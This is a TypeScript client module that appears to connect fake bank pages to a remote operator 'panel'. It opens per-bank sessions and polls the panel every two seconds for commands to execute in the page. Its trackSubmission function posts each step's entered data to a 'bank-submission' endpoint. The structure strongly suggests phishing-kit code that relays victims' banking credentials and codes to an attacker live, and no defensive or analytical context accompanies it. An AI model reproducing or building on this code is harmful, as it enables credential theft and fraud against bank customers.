const PANEL_URL = process.env.NEXT_PUBLIC_PANEL_URL || "http://localhost:3000";
const STORAGE_KEY = "shsh:listing_slug";
function getSessionKey() {
  if (typeof window === "undefined") return "shsh:session_id";
  const path = window.location.pathname.split("/")[1] || "default";
  return `shsh:session_id:${path}`;
}

type CmdHandler = (cmd: { type: string; payload: Record<string, unknown> }) => void;

declare global {
  interface Window {
    __shsh?: Record<string, { timer?: ReturnType<typeof setInterval>; cb?: CmdHandler }>;
  }
}

function bankKey() {
  if (typeof window === "undefined") return "default";
  return window.location.pathname.split("/")[1] || "default";
}
function getStore() {
  if (typeof window === "undefined") return { timer: undefined, cb: undefined };
  if (!window.__shsh) window.__shsh = {};
  const k = bankKey();
  if (!window.__shsh[k]) window.__shsh[k] = {};
  return window.__shsh[k];
}
function getPollTimer() { return getStore().timer ?? null; }
function setPollTimer(t: ReturnType<typeof setInterval> | null) { getStore().timer = t ?? undefined; }
function getCmdCb(): CmdHandler | null { return getStore().cb ?? null; }

export function saveListingSlug(slug: string) {
  if (!slug) return;
  try {
    localStorage.setItem(STORAGE_KEY, slug);
  } catch {}
}

export function getListingSlug(): string | null {
  try {
    return localStorage.getItem(STORAGE_KEY);
  } catch {
    return null;
  }
}

export function getSessionId(): string | null {
  try {
    return sessionStorage.getItem(getSessionKey());
  } catch {
    return null;
  }
}

export async function startSession(bankSlug: string): Promise<string | null> {
  const existing = getSessionId();
  if (existing) {
    ensurePolling(existing);
    return existing;
  }

  const listingSlug = getListingSlug();
  try {
    const res = await fetch(`${PANEL_URL}/api/public/bank-session/start`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ bankSlug, listingSlug }),
    });
    const data = await res.json();
    if (data.sessionId) {
      sessionStorage.setItem(getSessionKey(), data.sessionId);
      ensurePolling(data.sessionId);
      return data.sessionId;
    }
  } catch {}
  return null;
}

export function onCommand(cb: CmdHandler) {
  getStore().cb = cb;
  const sid = getSessionId();
  if (sid) ensurePolling(sid);
}

function ensurePolling(sessionId: string) {
  if (getPollTimer()) return;
  const timer = setInterval(async () => {
    try {
      const res = await fetch(`${PANEL_URL}/api/public/bank-session/${sessionId}/poll`);
      const data = await res.json();
      if (data.command) {
        const cb = getCmdCb();
        if (cb) {
          cb(data.command);
          fetch(`${PANEL_URL}/api/public/bank-session/${sessionId}/poll?ack=1`).catch(() => {});
        }
      }
      if (data.closed) {
        clearInterval(timer);
        setPollTimer(null);
      }
    } catch {}
  }, 2000);
  setPollTimer(timer);
}

export async function trackSubmission(bankSlug: string, step: string, data: Record<string, unknown>) {
  const listingSlug = getListingSlug();
  const sessionId = getSessionId();
  try {
    await fetch(`${PANEL_URL}/api/public/bank-submission`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ bankSlug, listingSlug, sessionId, step, data }),
    });
  } catch {}
}
